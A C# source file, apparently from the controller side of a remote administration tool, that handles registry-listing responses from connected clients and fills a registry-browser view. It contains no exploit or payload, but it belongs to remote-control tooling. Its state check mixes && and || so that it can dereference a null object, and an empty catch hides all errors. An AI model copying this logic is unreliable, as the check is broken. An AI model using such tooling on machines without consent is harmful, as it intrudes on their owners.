using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using Microsoft.Win32;
using xServer.Core.Networking;

namespace xServer.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT MANIPULATE THE REGISTRY. */
    public static partial class CommandHandler
    {
        public static void HandleLoadRegistryKey(xServer.Core.Packets.ClientPackets.GetRegistryKeysResponse packet, Client client)
        {
            try
            {
                // Make sure that we can use the packet.
                if ((packet.Key != null) && (packet.Value != null) && (packet.Data != null))
                {
                    // Make sure that the client is in the correct state to handle the packet appropriately.
                    if (client != null && client.Value.FrmRe != null && !client.Value.FrmRe.IsDisposed || !client.Value.FrmRe.Disposing)
                    {
                        // Make sure that all of the arrays are of a valid length.
                        if ((packet.Key.Length > 0) && (packet.Key.Length == packet.Value.Length) && (packet.Key.Length == packet.Data.Length))
                        {
                            Utilities.RegSeekerMatch[] Matches = new Utilities.RegSeekerMatch[packet.Key.Length];

                            // Build the matches into a single array.
                            for (int i = 0; i < packet.Key.Length; i++)
                            {
                                Matches[i] = new Utilities.RegSeekerMatch(packet.Key[i], packet.Value[i], packet.Data[i]);
                            }

                            if (packet.IsRootKey)
                            {
                                foreach (Utilities.RegSeekerMatch match in Matches)
                                {
                                    client.Value.FrmRe.AddRootKey(match);
                                }
                            }
                            else
                            {
                                // Add the key to the TreeView.
                                // ToDo: Add the regular keys (matches) to the TreeView.
                                // ToDo: Maintain order when adding to the TreeView.
                            }
                        }
                    }
                }
            }
            catch
            { }
        }
    }
}